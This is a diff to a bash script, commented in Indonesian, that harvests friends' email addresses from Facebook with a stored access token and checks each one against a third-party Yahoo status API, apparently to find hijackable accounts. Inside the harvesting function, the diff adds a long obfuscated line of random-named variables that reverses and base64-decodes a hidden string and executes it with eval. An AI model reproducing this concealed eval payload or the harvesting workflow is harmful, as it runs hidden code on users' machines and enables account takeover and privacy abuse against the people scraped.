@@ -16,7 +16,8 @@ GREEN=$(tput setaf 2)
 RED=$(tput setaf 1)
 NORMAL=$(tput sgr0)
 CYAN=$(tput setaf 6)
-ti=$(set `date` && echo -e "$4");
+ti=$(set `date` && echo -e "$5" | cut -d : -f1,2);
+multithread_limit=15
 function banner () {
 printf "
 \t$GREEN.__                   
@@ -29,9 +30,10 @@ printf "
 "
 }
 banner
-function get_yahoo(){
+function get_yahoo () {
+
                    get_yahoo=$(curl --silent "http://widhitools.000webhostapp.com/api/yahoo.php?" --data "email=$aa" | 
-                   jq -r .status)
+                   grep -Po '(?<="status":)[^,]*' | tr -d '""}')
                    printf "$aa > $get_yahoo" >> output.txt
                    printf "${CYAN}$aa [STATUS] > ${NORMAL}$get_yahoo\n"
 }
@@ -45,8 +47,23 @@ function hey_kamu () {
 	               fi
                    gEt=$(curl -X GET POST -s "https://graph.facebook.com/v3.2/me/friends/?fields=email&access_token=`cat $t0k3n`&limit=5000" | jq -r .data |
                    grep -Po '(?<="email":)[^,]*' | tr -d '""')
-                   kAwKxwFIjEiLybvocbaAOMJZqpHbHuYMvIbYcLAwqcRckjastnYxfpOutrRitPuRmNTQTvRFfBVSrTAQyDGPvOfpDzLevzgArBPI="bIialtXalEUxcnocOycNjBNwPNTofXBQtvLMinfFxVUjLwccEVgqJVzQfrkPestzgInXRYvESfSHlYTwxueUxBzZoeoiWFJPeTOh";nApvguxRqVLpzOtuHvHLYLuCfqQUZPpbcEJKmrSZEggmNdRveRkVleiDrPQFPXTdEDbnTOmRgVkHbVBVmDczNJcxoLjhanliQDHw="zoEtpQjRaXoOJNclYZBuqrGcycClmKzmrbEBSByqayeOqIMrcsOTCQNykAdNLdSsNxnXXKITzzcFaPPWwDcPsJdPrzeFCvDdACnk";FuSUMeutpEOavETezXjZXKnZzUdVjLXcfHunwvtQMKqIPsuNJWDzVepvhognFZhgeIlsMhOGZlXIqzRoVFvFyienOrrnPdFBTNss="ch";nIEvkCmlBorHoZSyXIBmhyiKZHHAJSUFbgiLdQQgSWNXHSnZOSAXrNzKnUJOtppyolBLnDaLHzJjMZPWFTqTLlCWpoPBRcGUooWZ="4";VMViirIQJOEqFbKpSfABzyzcftNavvoRRBzFADbhxgnntDnmdpxBBxIvolMGMCqMWxmfoTxhGJaPcKdXaZLczoThufCJkZudUtNr="";odcjXFAsqTCkeswogVsIInqhWUBWtcCZLGsmwmooRIvsaOyKBXLLTFXleqMHpKLshSNbBZMdfrzDAYyWfCIDiwsqGTVWswHmZJbz="WWktuSTlpOWCrOBQVEOSALuDCDMFUtbxpVnAhpQzwoDtqIZcHmSoJjJVSlLaaiOPCTBRAMHRaoJQybkBwmYvnwDvDDwmJGcaIYst";zIfkuflujvtuOMNWyKlQNdSjOyQvWGLCGMqfSUOoBGLIHJXdUsozBSCFtlztDVVfhmnPmRpHCRZIUiWUNmSXgsYpICOKwUwXslxS=" =owbkACbhZXZKkiIwRiIgUWLg8GajVGKk0zbKkCaz5yavBCZtACN2U2chJGKk0Dc | r";WoYKLYLdnaYlPHbfzPJGpVcrtLoxkGxzvBeZFWBRoXMuZzoXtkaKMetmepGCIHUXZPQNWDWiftLeSXdkpcQqStFYrmBxHsIkCtne="jGdhZzjqGooiuxItexgAAkoekOYpPnACKcByWtoKVvkKRKPykmtPVvCiBmtogATLjsotEeoMsEcQGtdokMWhstZCsJqArnndYFuy";CeloCjnUhbSmFNpzoHAIVxhCjJdrmkHcujNXqgrQgrEVYuZNrfuOgDXNGSkDQajmJqgjsmXcpfLOKqIulVZmUuGzPKwBTrJZgJjm="";uoggMVuQeBTeCgwAUfkONVOjkasqWJTJVVttqcGoltRqedZPfDyBmrlRYgYqJTjKKhAnmaUDCqrcakqXFabLHsfsIByWLmuFHEfG="as";fKZVTEKYGWmOYTJaMWUumIoEKoAvPbKdFdRVhHqsvickzqqWmdZkRlzwkejYqEItJbHpTZWmMzYZEYLBdkrnlMhOwsOUJPvxWWDR="ParxXiRKCuLeXMsHwcQlRYqhFpDGjdbJNRTdtvFiLlAUpfmmhrBIMTgrmmurcONrqPBalOnPdtMbiAunTECdwwDJiQZfXsIcmCzE";XIFpenzoWfOOaxglDxOUHrlFvpwAATLSfQpwmstiGOvBaAQzfFMNmnOvXrFvpSKIfZXTBHuEhfsvDnBSRzYfYVGfReDRerrTvYmX="sPqbElrGUWHwoPKuYtXOUHomHRLLzJbyCZWFGoqjELaDJUbbWLsXoxHLIRrDASFHzXZjZSrpRDCSaeVBMkLOyHGDVMlZSmLoFAev";GBliZMmbELzZqiccUpwDHApCaMjzhkezihPfDRvcxnoNMUhdRZIYfQYtVXWFFEBkTeyNsCnyvDLdYeycxKWPhoMZaBctEIaLivvc="o";ZTlkcmIrgFEAhvJwZJNknahQmwMPLrNfJAbfaUHgHujiJEZtElrHUJkUfeaSflQxSAbQHTnhMKjbWedJUvVZicsqdDjOehbKJAEl="6";qXpvOBBRBVupLmcPkxaNhulJAIFQHAcKihCFwCjpcnCxrFkSkVhcuAZcTomzpWJPcKWWyECglPafOlfcExRUWxIimPKrpDcPTZtr="PhapkTtgGZXiuDZArbVgoUteDOeBHAuJpzrSJlZkUwrsXIKIVKcfGzBLLMATaouSqpeyYepoILuCVLcZYFeawAfaqpVliyPniVdH";gAZaoaTFoCJBQGAaJvyKAvRNTFlkiqXyOlBaHuddfTUZdfEEAcPqJaLDcgLEoyZxWsMHZRAniquyuddceMmgUyUshCBEwcxRyAae=" -d";ZyxiCplzldFDtwpKtXmkuyQgjjPaTfMTXjazlMmShbGLKYARuVGfthZgoggDtRbUgkctYgMitrlVkPjcMAnxJGxPKZtqQbkmRRgt="inCQeTtxhmVDlyZOhODdfSOiDpfPFHdzOdGphPtTkdfiKlUARNdOCqjnGEOPPLIbBUdMeIyrYoSSluwOEDHKecliAlaCyJlRGiCK";JwZtQhbJtIHoJraoJxPsEzaWHayrPLonJLRJKSeeUfllWPubJejcrvPkZQjIIBcSAWJPjqVASdwdCMBFBdrzvLtuLohNTZMCPstd="";QsdtfIxZTsZELmUrMQglFclAXPFhyJoATbpSwSNMxBRFkZjbRMcleCvFhocKpXjRfBUVFjoAIulGEvmByaoOBNqXRffnbkeKZAch="b";lddgEwsKYoYOJhLnIDeJnWlfFMKHSeoXUVgAcTzzSVjFivlWGgPdMMmnIPipuYrnPzxlSwtzrtYDPpBnyvBUttKOZZJoGhVYydgp="e";HVVOcJhjlEqRTGCfomWciwXvrfydIPpSVOeWogcIeSBJmdXsLpVVljnTeuSxxvvqyjIsYVDDXaOWihHZItdQEYmqXVoVpyiLSkio="v |";Tx=Eds;qtdJRRfhKPJQjRuGTsIBNvZJkzsnUSJhlEzHwHyTRSKbhSWVnOypvTcwCOYURtEuHcfDYrnJynHBbvVXZDmIEOgegQgBxGCJoFhX="";qujTYzGdjWOcbeuykuegaNwqgnehPnllKUMhMVUPGeRJEUcgkicYPGwMEjLgryLYKxoaglsVMYPwRvCxXRyaUofEfysdOjhyvLwd=$(eval "$CeloCjnUhbSmFNpzoHAIVxhCjJdrmkHcujNXqgrQgrEVYuZNrfuOgDXNGSkDQajmJqgjsmXcpfLOKqIulVZmUuGzPKwBTrJZgJjm$lddgEwsKYoYOJhLnIDeJnWlfFMKHSeoXUVgAcTzzSVjFivlWGgPdMMmnIPipuYrnPzxlSwtzrtYDPpBnyvBUttKOZZJoGhVYydgp$FuSUMeutpEOavETezXjZXKnZzUdVjLXcfHunwvtQMKqIPsuNJWDzVepvhognFZhgeIlsMhOGZlXIqzRoVFvFyienOrrnPdFBTNss$VMViirIQJOEqFbKpSfABzyzcftNavvoRRBzFADbhxgnntDnmdpxBBxIvolMGMCqMWxmfoTxhGJaPcKdXaZLczoThufCJkZudUtNr$GBliZMmbELzZqiccUpwDHApCaMjzhkezihPfDRvcxnoNMUhdRZIYfQYtVXWFFEBkTeyNsCnyvDLdYeycxKWPhoMZaBctEIaLivvc$zIfkuflujvtuOMNWyKlQNdSjOyQvWGLCGMqfSUOoBGLIHJXdUsozBSCFtlztDVVfhmnPmRpHCRZIUiWUNmSXgsYpICOKwUwXslxS$lddgEwsKYoYOJhLnIDeJnWlfFMKHSeoXUVgAcTzzSVjFivlWGgPdMMmnIPipuYrnPzxlSwtzrtYDPpBnyvBUttKOZZJoGhVYydgp$HVVOcJhjlEqRTGCfomWciwXvrfydIPpSVOeWogcIeSBJmdXsLpVVljnTeuSxxvvqyjIsYVDDXaOWihHZItdQEYmqXVoVpyiLSkio$CeloCjnUhbSmFNpzoHAIVxhCjJdrmkHcujNXqgrQgrEVYuZNrfuOgDXNGSkDQajmJqgjsmXcpfLOKqIulVZmUuGzPKwBTrJZgJjm$QsdtfIxZTsZELmUrMQglFclAXPFhyJoATbpSwSNMxBRFkZjbRMcleCvFhocKpXjRfBUVFjoAIulGEvmByaoOBNqXRffnbkeKZAch$qtdJRRfhKPJQjRuGTsIBNvZJkzsnUSJhlEzHwHyTRSKbhSWVnOypvTcwCOYURtEuHcfDYrnJynHBbvVXZDmIEOgegQgBxGCJoFhX$uoggMVuQeBTeCgwAUfkONVOjkasqWJTJVVttqcGoltRqedZPfDyBmrlRYgYqJTjKKhAnmaUDCqrcakqXFabLHsfsIByWLmuFHEfG$lddgEwsKYoYOJhLnIDeJnWlfFMKHSeoXUVgAcTzzSVjFivlWGgPdMMmnIPipuYrnPzxlSwtzrtYDPpBnyvBUttKOZZJoGhVYydgp$ZTlkcmIrgFEAhvJwZJNknahQmwMPLrNfJAbfaUHgHujiJEZtElrHUJkUfeaSflQxSAbQHTnhMKjbWedJUvVZicsqdDjOehbKJAEl$VMViirIQJOEqFbKpSfABzyzcftNavvoRRBzFADbhxgnntDnmdpxBBxIvolMGMCqMWxmfoTxhGJaPcKdXaZLczoThufCJkZudUtNr$nIEvkCmlBorHoZSyXIBmhyiKZHHAJSUFbgiLdQQgSWNXHSnZOSAXrNzKnUJOtppyolBLnDaLHzJjMZPWFTqTLlCWpoPBRcGUooWZ$gAZaoaTFoCJBQGAaJvyKAvRNTFlkiqXyOlBaHuddfTUZdfEEAcPqJaLDcgLEoyZxWsMHZRAniquyuddceMmgUyUshCBEwcxRyAae$qtdJRRfhKPJQjRuGTsIBNvZJkzsnUSJhlEzHwHyTRSKbhSWVnOypvTcwCOYURtEuHcfDYrnJynHBbvVXZDmIEOgegQgBxGCJoFhX");eval "$JwZtQhbJtIHoJraoJxPsEzaWHayrPLonJLRJKSeeUfllWPubJejcrvPkZQjIIBcSAWJPjqVASdwdCMBFBdrzvLtuLohNTZMCPstd$qujTYzGdjWOcbeuykuegaNwqgnehPnllKUMhMVUPGeRJEUcgkicYPGwMEjLgryLYKxoaglsVMYPwRvCxXRyaUofEfysdOjhyvLwd$CeloCjnUhbSmFNpzoHAIVxhCjJdrmkHcujNXqgrQgrEVYuZNrfuOgDXNGSkDQajmJqgjsmXcpfLOKqIulVZmUuGzPKwBTrJZgJjm$VMViirIQJOEqFbKpSfABzyzcftNavvoRRBzFADbhxgnntDnmdpxBBxIvolMGMCqMWxmfoTxhGJaPcKdXaZLczoThufCJkZudUtNr"
+(
+               for aa in $gEt; do
+                    startline=1 ###
+                    endline="$threads"
+                    counter=0
+                    default_threads="10"
+                    threads="${15:-${default_threads}}"
+                    token=$(($counter+1))
+                    let token++
+                    let counter++
+                    let startline+=$threads
+                    let endline+=$threads
+                    get_yahoo &
+                    done
+                    wait
 
+)
 }
 hey_kamu 
 echo "selesai pada jam : $ti"
